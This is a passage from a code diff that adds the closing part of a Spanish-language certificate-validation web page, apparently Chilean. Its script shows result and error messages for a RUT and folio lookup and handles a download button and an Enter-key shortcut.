+    }else{
+      rb.className='rbox no';
+      rb.innerHTML= data.message || 'No se encontró un certificado válido con los datos ingresados. Verifica el RUT y folio e intenta nuevamente.';
+      rb.style.display='block'
+    }
+  }catch(err){
+    lo.classList.remove('show');
+    rb.className='rbox no';
+    rb.innerHTML='Error al validar. Intenta nuevamente más tarde.';
+    rb.style.display='block'
+  }
+});
+
+// Evento para el nuevo botón de descarga
+document.getElementById('btn-download').addEventListener('click', function() {
+    if(window.downloadData) {
+        const a = document.createElement('a');
+        a.href = window.downloadData.url;
+        a.download = window.downloadData.filename;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+    }
+});
+
+document.addEventListener('keydown',e=>{if(e.key==='Enter'&&!bv.disabled)bv.click()});
+</script>
+</body>
+</html>
